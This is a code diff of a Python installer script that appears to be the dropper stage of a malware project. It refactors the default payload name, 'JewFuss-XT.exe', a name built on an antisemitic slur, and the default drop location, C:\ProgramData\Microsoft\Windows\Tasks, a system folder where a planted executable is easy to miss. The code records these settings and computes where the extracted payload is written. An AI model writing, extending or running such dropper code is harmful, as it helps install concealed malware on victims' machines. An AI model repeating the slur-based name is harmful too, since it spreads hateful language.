@@ -12,23 +12,25 @@ SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
 LOG = os.path.join(SCRIPT_DIR, "installer.log"), False # (path, enable)
 os.chdir(SCRIPT_DIR)
 
+defaultpath = r"C:\ProgramData\Microsoft\Windows\Tasks"
+defaultexe = "JewFuss-XT.exe"
 try:
     if os.path.splitext(sys.argv[0])[1].lower() == ".py":
         installer_icon = f'--icon "{args.icon}"' if args.icon is not None else ""
         if args.file is None:
-            input_exe = input("Enter the name of the executable in the builds folder, leave empty to use JewFuss-XT.exe:\n>> ")
+            input_exe = input(f"Enter the name of the executable in the builds folder, leave empty to use {defaultexe}:\n>> ")
         else:
             print(f'Using provided file: "{args.file}"')
             input_exe = args.file
         if not input_exe:
-            input_exe = "JewFuss-XT.exe"
+            input_exe = defaultexe
         while not os.path.exists(f"builds/{input_exe}"):
             input_exe = input("Invalid executable (Tip: make sure the executable is in the builds folder):\n>> ")
         exename_txt = "executablename.txt"
         with open(exename_txt, "w", encoding="utf-8") as f:
             f.write(input_exe)
         tgtpath_txt = "compiled_targetpath.txt"
-        compiled_target = args.targetpath or r"C:\ProgramData\Microsoft\Windows\Tasks"
+        compiled_target = args.targetpath or defaultpath
         with open(tgtpath_txt, "w", encoding="utf-8") as f:
             f.write(compiled_target)
         if args.name is not None:
@@ -87,7 +89,7 @@ if not payload_name:
     except Exception:
         pass
 if not payload_name:
-    payload_name = "JewFuss-XT.exe"
+    payload_name = defaultexe
 
 extracted_payload = os.path.join(bp, payload_name)
 
@@ -103,7 +105,7 @@ if args.prevpath:
     if not final_path.lower().endswith(".exe"):
         final_path += ".exe"
 else:
-    tgt = args.targetpath or compiled_targetpath or r"C:\ProgramData\Microsoft\Windows\Tasks"
+    tgt = args.targetpath or compiled_targetpath or defaultpath
     tgt = os.path.abspath(tgt)
     if tgt.lower().endswith(".exe"):
         final_path = tgt
